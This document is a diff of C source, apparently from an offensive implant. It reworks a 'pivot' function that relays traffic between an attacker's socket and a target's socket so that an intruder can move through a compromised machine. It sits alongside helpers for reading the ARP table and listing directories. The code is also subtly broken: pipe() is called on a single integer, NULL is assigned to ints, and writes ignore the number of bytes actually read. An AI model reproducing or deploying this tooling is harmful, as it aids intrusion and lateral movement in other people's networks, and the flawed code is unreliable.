@@ -7,9 +7,9 @@
 #include "dbg.h"
 #include <strings.h>
 #include <unistd.h>
+#include <sys/select.h>
 
-volatile int attacker_sockfd = NULL;
-volatile int target_sockfd = NULL;
+volatile int close_pipe = NULL;
 
 ArpResult *get_arp(char *argv, int argc) {
     char line[500];                         // create a temporary line with 500 bytes limit
@@ -145,6 +145,9 @@ struct StringArray *get_dir_list(char *argv, int argc) {
 
 void* pivot(void *pinput) {
     ssize_t n;
+    fd_set sockets;
+    int attacker_sockfd = NULL;
+    int target_sockfd = NULL;
     struct sockaddr_in attacker_server_address, target_server_address;
     char buffer[BUFFER_SIZE];
     struct PivotInput *input = (struct PivotInput*) pinput;
@@ -181,35 +184,64 @@ void* pivot(void *pinput) {
         goto error;
     }
 
+    int select_ret = 0;
+    if (pipe(&close_pipe) == -1) {
+        log_err("pipe creation failed");
+        set_zero_errno();
+        goto error;
+    }
+
+
     while (true) {
-        bzero(buffer, BUFFER_SIZE);
-        n = read(attacker_sockfd, &buffer, (BUFFER_SIZE - 1));
-        if (n < 0) {
-            log_err("Broken pipe (attacker)");
+        FD_ZERO(&sockets);
+        FD_SET((unsigned int)attacker_sockfd,&sockets);
+        FD_SET((unsigned int)target_sockfd,&sockets);
+        FD_SET((unsigned int)close_pipe,&sockets);
+        memset((char *)&buffer,0, BUFFER_SIZE);
+        if((attacker_sockfd < target_sockfd) && (target_sockfd > close_pipe)){
+            select_ret = select(target_sockfd+1,&sockets,NULL,NULL,NULL);
+        }
+        else if((attacker_sockfd > target_sockfd) && (attacker_sockfd > close_pipe)){
+            select_ret = select(attacker_sockfd+1,&sockets,NULL,NULL,NULL);
+        }
+        else{
+            select_ret = select(close_pipe+1,&sockets,NULL,NULL,NULL);
+        }
+        if(select_ret == -1){
+            log_err("Broken pipe");
             set_zero_errno();
             goto error;
         }
-        if (strcmp((char *)&buffer, "exit") == 0) {
+        if(FD_ISSET(attacker_sockfd,&sockets)){
+            n = read(attacker_sockfd,&buffer,BUFFER_SIZE-1);
+            if (n <= 0) {
+                log_err("Broken pipe (attacker)");
+                set_zero_errno();
+                goto error;
+            }
+            n = write(target_sockfd,&buffer,BUFFER_SIZE-1);
+            if (n <= 0) {
+                log_err("Broken pipe (target)");
+                set_zero_errno();
+                goto error;
+            }
+        }
+        else if(FD_ISSET(target_sockfd,&sockets)){
+            n = read(target_sockfd,&buffer,BUFFER_SIZE-1);
+            if (n <= 0) {
+                log_err("Broken pipe (target)");
+                set_zero_errno();
+                goto error;
+            }
+            n = write(attacker_sockfd,&buffer,BUFFER_SIZE-1);
+            if (n <= 0) {
+                log_err("Broken pipe (attacker)");
+                set_zero_errno();
+                goto error;
+            }
+        }
+        else{
             break;
-        }
-        n = write(target_sockfd, &buffer, BUFFER_SIZE);
-        if (n < 0) {
-            log_err("Broken pipe (target)");
-            set_zero_errno();
-            goto error;
-        }
-        bzero(buffer, BUFFER_SIZE);
-        n = read(target_sockfd, &buffer, (BUFFER_SIZE - 1));
-        if (n < 0) {
-            log_err("Broken pipe (attacker)");
-            set_zero_errno();
-            goto error;
-        }
-        n = write(attacker_sockfd, &buffer, BUFFER_SIZE);
-        if (n < 0) {
-            log_err("Broken pipe (target)");
-            set_zero_errno();
-            goto error;
         }
     }
 
@@ -226,12 +258,14 @@ void* pivot(void *pinput) {
     return NULL;
 }
 int kill_pivot(){
-    if(attacker_sockfd && target_sockfd) {
-        close(attacker_sockfd);
-        close(target_sockfd);
-        return 0;
-    }
-    else{
-        return -1;
-    }
+        if(close_pipe){
+            char* sig = "1";
+            if(write(close_pipe,&sig,1) < 0){
+                return -1;
+            }
+            return 0;
+        }
+        else{
+            return -1;
+        }
 }
